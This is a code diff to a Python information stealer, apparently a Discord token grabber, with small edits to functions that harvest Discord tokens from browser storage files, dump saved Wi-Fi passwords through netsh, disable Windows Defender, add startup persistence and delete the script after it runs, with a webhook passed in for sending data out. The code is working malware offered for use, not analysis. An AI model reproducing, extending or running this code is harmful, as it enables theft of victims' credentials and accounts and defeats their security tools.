@@ -47,7 +47,6 @@ temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxy
 mk_temp = os.mkdir(temp_path)
 localappdata = os.getenv("localappdata")
 
-
 def main(webhook: str):
     threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
@@ -154,7 +153,8 @@ def startup():
 
 
 def self_destruct():
-    os.remove(__file__)
+    with open(f"{temp}/main.py", 'w') as file:
+        file.write("import os\nos.remove(__file__)")
 
 
 def disable_defender():
@@ -351,7 +351,7 @@ class Discord:
                                     if uid not in self.ids:
                                         self.tokens.append(token)
                                         self.ids.append(uid)
-
+            else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
@@ -730,8 +730,7 @@ class Wifi:
                 with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                     f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                 f.close()
-
-        self.name_pass[i] = ""
+                
         for i in self.wifi_list:
             command = subprocess.getoutput(
                 f'netsh wlan show profile "{i}" key=clear')
